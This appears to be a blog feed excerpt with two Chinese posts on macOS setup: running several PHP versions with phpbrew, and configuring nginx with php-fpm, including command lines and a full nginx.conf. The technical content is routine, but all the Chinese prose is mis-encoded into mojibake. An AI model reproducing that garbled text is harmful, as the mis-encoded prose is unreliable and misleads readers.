    <content type="html"><![CDATA[<p>macä¸‹å®‰è£…å¤šç‰ˆæœ¬phpå’Œé…ç½®php-fpmçš„ä¸€äº›å‘</p><a id="more"></a><h2 id="phpbrewçš„å®‰è£…"><a href="#phpbrewçš„å®‰è£…" class="headerlink" title="phpbrewçš„å®‰è£…"></a>phpbrewçš„å®‰è£…</h2><p>è¯·å‚è€ƒ<a href="https://github.com/phpbrew/phpbrew/blob/master/README.cn.md" target="_blank" rel="noopener">phpbrewçš„å®‰è£…</a></p><h2 id="php-vå’Œï¼ˆphp-fpmæˆ–-phpinfo-ï¼‰ç‰ˆæœ¬ä¸ä¸€æ ·"><a href="#php-vå’Œï¼ˆphp-fpmæˆ–-phpinfo-ï¼‰ç‰ˆæœ¬ä¸ä¸€æ ·" class="headerlink" title="php -vå’Œï¼ˆphp-fpmæˆ– phpinfo()ï¼‰ç‰ˆæœ¬ä¸ä¸€æ ·"></a>php -vå’Œï¼ˆphp-fpmæˆ– phpinfo()ï¼‰ç‰ˆæœ¬ä¸ä¸€æ ·</h2><p>ç”¨<code>phpbrew</code>å®‰è£…<code>php5.6.30</code>ï¼Œç„¶åç”¨<code>phpbrew switch php-5.6.30</code>åˆ‡æ¢æˆ<code>5.6.30</code></p><p>åœ¨ç»ˆç«¯ä¸‹ä½¿ç”¨<code>php -v</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP 5.6.30 (cli) (built: May 14 2019 18:30:16)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br></pre></td></tr></table></figure><p>åœ¨ç»ˆç«¯ä¸‹ä½¿ç”¨<code>php-fpm -v</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP 7.1.16 (fpm-fcgi) (built: Mar 31 2018 03:00:16)</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies</span><br></pre></td></tr></table></figure><p>åœ¨webç«¯å¦‚ä¸‹</p><p><img src="http://images.xianyu123.club/php-fpm_problem.png" alt></p><h3 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h3><h4 id="æ·»åŠ php-fpmè½¯é“¾"><a href="#æ·»åŠ php-fpmè½¯é“¾" class="headerlink" title="æ·»åŠ php-fpmè½¯é“¾"></a>æ·»åŠ php-fpmè½¯é“¾</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /Users/kb/.phpbrew/php/php-5.6.30/sbin/php-fpm /usr/sbin/php-fpm</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>/usr/sbin</code>ä¸‹å­˜åœ¨<code>php-fpm</code>ï¼Œå°±å…ˆæŠŠåŸæ¥çš„åˆ é™¤</p><p>åˆ›å»ºè½¯è¿æ¥ä»¥åï¼Œå…³é—­ç»ˆç«¯ï¼Œé‡æ–°è¿›å…¥ï¼Œåˆ†åˆ«è¿è¡Œ<code>php -v</code>å’Œ<code>php-fpm -v</code>çœ‹ä¸‹ç‰ˆæœ¬æ˜¯å¦ä¸€è‡´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php -v</span><br><span class="line">PHP 5.6.30 (cli) (built: May 28 2019 16:01:05)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br><span class="line"></span><br><span class="line">php-fpm -v</span><br><span class="line">PHP 5.6.30 (fpm-fcgi) (built: May 28 2019 16:01:14)</span><br><span class="line">Copyright (c) 1997-2016 The PHP Group</span><br><span class="line">Zend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies</span><br></pre></td></tr></table></figure><p>é…ç½®å®Œä¸Šé¢åï¼Œåœ¨webé¡µé¢æ‰“å¼€ä¼šé‡åˆ°è®¿é—®phpé¡µé¢404çš„é—®é¢˜</p><h2 id="è§£å†³nginxè®¿é—®phpé¡µé¢404é—®é¢˜"><a href="#è§£å†³nginxè®¿é—®phpé¡µé¢404é—®é¢˜" class="headerlink" title="è§£å†³nginxè®¿é—®phpé¡µé¢404é—®é¢˜"></a>è§£å†³nginxè®¿é—®phpé¡µé¢404é—®é¢˜</h2><p>æŸ¥çœ‹<code>php5.6.30 sock</code>çš„ç»å¯¹è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ./.phpbrew/php/php-5.6.30/etc/php-fpm.conf | grep &quot;listen = /&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠè¿™ä¸ªè·¯å¾„æ·»åŠ åˆ°nginx çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œnginx çš„é…ç½®æ–‡ä»¶åœ¨<code>/usr/local/etc/nginx/nginx.conf</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">root</span>           html;</span><br><span class="line">  <span class="attribute">fastcgi_pass</span>   unix:è·¯å¾„åœ°å€;</span><br><span class="line">    <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">    <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è§£å†³Permission-denied-while-connecting-to-upstreamé—®é¢˜"><a href="#è§£å†³Permission-denied-while-connecting-to-upstreamé—®é¢˜" class="headerlink" title="è§£å†³Permission denied while connecting to upstreamé—®é¢˜"></a>è§£å†³Permission denied while connecting to upstreamé—®é¢˜</h2><p>è¿‡ç¨‹ä¸­ç¢°åˆ°<code>[crit] 2963#0: *138 connect() to unix:/tmp/php5-fpm.sock failed (13: Permission denied) while connecting to upstream</code>çš„é—®é¢˜, è¿™æ˜¯ç”±äºæ²¡æœ‰æŒ‡å®šnginxçš„ç”¨æˆ·, nginxçš„ç”¨æˆ·æ²¡æœ‰æƒé™è®¿é—®fpmé€ æˆçš„<br>åœ¨<code>/Users/kb/.phpbrew/php/php-5.6.30/etc/php-fpm.conf</code>ä¸­æ‰¾åˆ°<code>listen</code>è¡Œ, åœ¨åé¢æ·»åŠ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listen.owner = nobody</span><br><span class="line">listen.group = nobody</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”åœ¨<code>/usr/local/etc/nginx/nginx.conf</code>ä¸­æ‰¾åˆ°<code>user</code>è¡Œ, é»˜è®¤çš„æ˜¯è¢«æ³¨é‡Šæ‰çš„, å–æ¶ˆæ³¨é‡Š, è¿™æ—¶çš„ç”¨æˆ·æ˜¯nobody, é‡å¯nginxå’Œfpm, é—®é¢˜å¾—åˆ°è§£å†³</p><p>ç„¶åå°±å¯ä»¥æ„‰å¿«åœ°ä½¿ç”¨php+nginx 5.6ç‰ˆæœ¬äº†</p><h2 id="æˆ‘çš„nginxçš„é…ç½®"><a href="#æˆ‘çš„nginxçš„é…ç½®" class="headerlink" title="æˆ‘çš„nginxçš„é…ç½®"></a>æˆ‘çš„nginxçš„é…ç½®</h2><p>ä¸‹é¢è´´å‡ºæˆ‘çš„nginxçš„é…ç½®</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#user  nobody;</span></span><br><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#error_log  logs/error.log;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  notice;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  info;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pid        logs/nginx.pid;</span></span><br><span class="line"><span class="attribute">env</span> PHPBREW_ROOT;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line">    <span class="comment">#                  '$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line">    <span class="comment">#                  '"$http_user_agent" "$http_x_forwarded_for"';</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#access_log  logs/access.log  main;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">82</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#charset koi8-r;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#access_log  logs/host.access.log  main;</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">root</span>   /Users/xianyu123/PhpstormProjects;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#error_page  404              /404.html;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">        <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># proxy the PHP scripts to Apache listening on 127.0.0.1:80</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">        <span class="comment">#    proxy_pass   http://127.0.0.1;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">            <span class="attribute">root</span>           /Users/xianyu123/PhpstormProjects;</span><br><span class="line">            <span class="comment"># fastcgi_pass   unix:/Users/xianyu123/.phpbrew/php/php-7.1.29/var/run/php-fpm.sock;</span></span><br><span class="line">            <span class="attribute">fastcgi_pass</span>   unix:/Users/xianyu123/.phpbrew/php/php-5.6.40/var/run/php-fpm.sock;</span><br><span class="line">            <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">            <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">            <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># deny access to .htaccess files, if Apache's document root</span></span><br><span class="line">        <span class="comment"># concurs with nginx's one</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ /\.ht &#123;</span></span><br><span class="line">        <span class="comment">#    deny  all;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># another virtual host using mix of IP-, name-, and port-based configuration</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#server &#123;</span></span><br><span class="line">    <span class="comment">#    listen       8000;</span></span><br><span class="line">    <span class="comment">#    listen       somename:8080;</span></span><br><span class="line">    <span class="comment">#    server_name  somename  alias  another.alias;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    location / &#123;</span></span><br><span class="line">    <span class="comment">#        root   html;</span></span><br><span class="line">    <span class="comment">#        index  index.html index.htm;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># HTTPS server</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#server &#123;</span></span><br><span class="line">    <span class="comment">#    listen       443 ssl;</span></span><br><span class="line">    <span class="comment">#    server_name  localhost;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_certificate      cert.pem;</span></span><br><span class="line">    <span class="comment">#    ssl_certificate_key  cert.key;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_session_cache    shared:SSL:1m;</span></span><br><span class="line">    <span class="comment">#    ssl_session_timeout  5m;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    ssl_ciphers  HIGH:!aNULL:!MD5;</span></span><br><span class="line">    <span class="comment">#    ssl_prefer_server_ciphers  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    location / &#123;</span></span><br><span class="line">    <span class="comment">#        root   html;</span></span><br><span class="line">    <span class="comment">#        index  index.html index.htm;</span></span><br><span class="line">    <span class="comment">#    &#125;</span></span><br><span class="line">    <span class="comment">#&#125;</span></span><br><span class="line">    <span class="attribute">include</span> servers/*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.leavesongs.com/PHP/php7-nginx-mysql-install-note.html" target="_blank" rel="noopener">php7 + nginx + mysql å®‰è£…å°è®¡</a></p><p><a href="https://juejin.im/post/5c8fb28a6fb9a07103548318" target="_blank" rel="noopener">ç¬”è®°ï¼šMACä½¿ç”¨brewé…ç½®nginxã€phpã€mysqlã€php-fpmã€redis</a></p><p><a href="https://www.cnblogs.com/mrzero/p/4295536.html" target="_blank" rel="noopener">Mac OSä¸‹é…ç½®PHP Nginx PHP-FPM</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;macä¸‹å®‰è£…å¤šç‰ˆæœ¬phpå’Œé…ç½®php-fpmçš„ä¸€äº›å‘&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>macä¸‹æ­å»ºnginx+php-fpm</title>
    <link href="http://0clickjacking0.github.io/2019/05/13/mac%E4%B8%8B%E6%90%AD%E5%BB%BAnginx-php-fpm/"/>
    <id>http://0clickjacking0.github.io/2019/05/13/macä¸‹æ­å»ºnginx-php-fpm/</id>
    <published>2019-05-13T06:31:20.000Z</published>
    <updated>2020-01-14T10:31:19.579Z</updated>
    
    <content type="html"><![CDATA[<p>macä¸‹æ­å»ºnginx+php-fpmçš„ç¬”è®°</p><a id="more"></a><h2 id="å®‰è£…æ­¥éª¤"><a href="#å®‰è£…æ­¥éª¤" class="headerlink" title="å®‰è£…æ­¥éª¤"></a>å®‰è£…æ­¥éª¤</h2><p>å¦‚æœæ²¡æœ‰å®‰è£…è¿‡brewï¼Œè¯·å‚è€ƒ<a href="https://www.jianshu.com/p/ab50ea8b13d6" target="_blank" rel="noopener">Mac OSä¸‹brewçš„å®‰è£…å’Œä½¿ç”¨</a></p><h3 id="1-åœæ­¢æœ¬åœ°ApacheæœåŠ¡"><a href="#1-åœæ­¢æœ¬åœ°ApacheæœåŠ¡" class="headerlink" title="1. åœæ­¢æœ¬åœ°ApacheæœåŠ¡"></a>1. åœæ­¢æœ¬åœ°ApacheæœåŠ¡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apachectl stop</span><br></pre></td></tr></table></figure><h3 id="2-å®‰è£…nginx"><a href="#2-å®‰è£…nginx" class="headerlink" title="2. å®‰è£…nginx"></a>2. å®‰è£…nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nginx</span><br></pre></td></tr></table></figure><h3 id="3-å¯åŠ¨nginx"><a href="#3-å¯åŠ¨nginx" class="headerlink" title="3. å¯åŠ¨nginx"></a>3. å¯åŠ¨nginx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><h3 id="4-è®¿é—®nginx"><a href="#4-è®¿é—®nginx" class="headerlink" title="4. è®¿é—®nginx"></a>4. è®¿é—®nginx</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ‰“å¼€æµè§ˆå™¨,è¾“å…¥å¦‚ä¸‹ç½‘å€,æ­£ç¡®çš„æƒ…å†µå°±å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„æˆªå›¾.</span><br><span class="line">http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/nginx_mac.png" alt></p><h3 id="5-æ–‡ä»¶è¯´æ˜"><a href="#5-æ–‡ä»¶è¯´æ˜" class="headerlink" title="5. æ–‡ä»¶è¯´æ˜"></a>5. æ–‡ä»¶è¯´æ˜</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡ä¸Šé¢çš„æ­¥éª¤,å°±è¡¨ç¤ºnginxå·²ç»å®Œæˆäº†.è¿™é‡Œæœ‰å‡ ä¸ªæ–‡ä»¶,æˆ‘ä»¬éœ€è¦å…³æ³¨ä¸€ä¸‹.</span><br><span class="line"></span><br><span class="line">/usr/local/etc/nginx/nginx.conf ï¼ˆé…ç½®æ–‡ä»¶è·¯å¾„ï¼‰</span><br><span class="line"></span><br><span class="line">/usr/local/var/www ï¼ˆæœåŠ¡å™¨é»˜è®¤è·¯å¾„ï¼‰</span><br><span class="line"></span><br><span class="line">/usr/local/Cellar/nginx/1.8.0 ï¼ˆå®‰è£…è·¯å¾„)</span><br></pre></td></tr></table></figure><h3 id="6-é…ç½®php"><a href="#6-é…ç½®php" class="headerlink" title="6.  é…ç½®php"></a>6.  é…ç½®php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1.å»æ‰nginx.confä¸­å¦‚ä¸‹ä»£ç ä¸­çš„æ³¨é‡Š(åœ¨å»æ‰ä¹‹å‰æœ€å¥½å¤‡ä»½ä¸€ä»½ cp nginx.conf nginx.conf.bak)</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line">è¯¥æ®µä»£ç çš„ä¸»è¦æ„æ€å°±æ˜¯è®©nginxèƒ½å¤Ÿè§£æåˆ°php,ä¸ç„¶ä½ å»è®¿é—®phpçš„æ–‡ä»¶,nginxä¼šé»˜è®¤ä¸‹è½½è¯¥phpæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">2.ä¿®æ”¹1ä¸­çš„éƒ¨åˆ†é…ç½®</span><br><span class="line">åŸé…ç½®ä¸­çš„å€¼ä¸º/scripts$fastcgi_script_name, éœ€è¦ä¿®æ”¹ä¸º$document_root$fastcgi_script_name</span><br><span class="line">è¯¥ä»£ç ä¸»è¦çš„æ„æ€å°±æ˜¯è®©nginxèƒ½å¤Ÿè¯†åˆ«åˆ°nginxé…ç½®æ–‡ä»¶ä¸­çš„rooté¡¹.ä¸ç„¶ä¼šæŠ¥not find fileé”™è¯¯ä¿¡æ¯.</span><br><span class="line"></span><br><span class="line">3.ç„¶åé‡å¯nginxæœåŠ¡</span><br><span class="line">nginx -s reload</span><br><span class="line"></span><br><span class="line">4.é…ç½®php-fpmæ–‡ä»¶</span><br><span class="line">sudo cp /private/etc/php-fpm.conf.default /private/etc/php-fpm.conf</span><br><span class="line">ä¿®æ”¹æˆ‘ä»¬æ–°å¤åˆ¶çš„php-fpm.confæ–‡ä»¶ä¸­çš„å¦‚ä¸‹é…ç½®é¡¹ç›®.ä¿®æ”¹ä¸ºä¸‹é¢çš„ç¤ºä¾‹,è®°å¾—æŠŠå‰é¢çš„åˆ†å·å»æ‰ï¼Œé»˜è®¤æ˜¯æ³¨é‡Šçš„</span><br><span class="line">pid=/usr/local/var/run/php-fpm.pid</span><br><span class="line">error_log=/usr/local/var/log/php-fpm.log</span><br><span class="line"></span><br><span class="line">5.å¯åŠ¨php-fpmæœåŠ¡</span><br><span class="line">sudo php-fpm</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡çš„æ—¶å€™å¯èƒ½ä¼šé‡åˆ°ä¸‹é¢çš„é—®é¢˜,åæ­£æˆ‘æ˜¯é‡åˆ°äº†(ä¸‹é¢çš„è·¯å¾„æ ¹æ®ä½ å›¾ç‰‡æŒ‡ç¤ºçš„è·¯å¾„æ¥å®š,å¯èƒ½æœ‰çš„ç¯å¢ƒè·¯å¾„ä¸ä¸€è‡´).è§£å†³åŠæ³•æ˜¯</p><p><img src="http://images.xianyu123.club/nginx_mac_error.jpeg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /data/server/php7/etc/php-fpm.d/www.conf.default /data/server/php7/etc/php-fpm.d/www.conf</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨å¯åŠ¨ä¸€æ¬¡,å³å¯</p><p>åœ¨ä¿®æ”¹æœåŠ¡å™¨é»˜è®¤è·¯å¾„éœ€è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œä¸èƒ½ç”¨<code>ï½</code>çš„ç›¸å¯¹è·¯å¾„</p><h3 id="7-æµ‹è¯•"><a href="#7-æµ‹è¯•" class="headerlink" title="7. æµ‹è¯•"></a>7. æµ‹è¯•</h3><p>åœ¨æœåŠ¡å™¨ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œå†…å®¹ä¸º<code>&lt;?php phpinfo(); ?&gt;</code>ï¼Œè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœå‡ºç°çš„æ˜¯<code>phpinfo</code>çš„é¡µé¢ä»£è¡¨æˆåŠŸäº†</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://www.imooc.com/article/283670" target="_blank" rel="noopener">Macç³»ç»Ÿä¸‹æ­å»ºNginx+php-fpm</a></p><p><a href="https://blog.csdn.net/zhengwish/article/details/79380088" target="_blank" rel="noopener">ERROR: failed to open error_log (/usr/var/log/php-fpm.log)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;macä¸‹æ­å»ºnginx+php-fpmçš„ç¬”è®°&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>æ¢ç”µè„‘åå¦‚ä½•è¿ç§»hexoåšå®¢</title>
    <link href="http://0clickjacking0.github.io/2019/05/11/%E6%8D%A2%E7%94%B5%E8%84%91%E5%90%8E%E5%A6%82%E4%BD%95%E8%BF%81%E7%A7%BBhexo%E5%8D%9A%E5%AE%A2/"/>
    <id>http://0clickjacking0.github.io/2019/05/11/æ¢ç”µè„‘åå¦‚ä½•è¿ç§»hexoåšå®¢/</id>
    <published>2019-05-11T13:46:05.000Z</published>
    <updated>2019-05-11T14:07:06.000Z</updated>
    
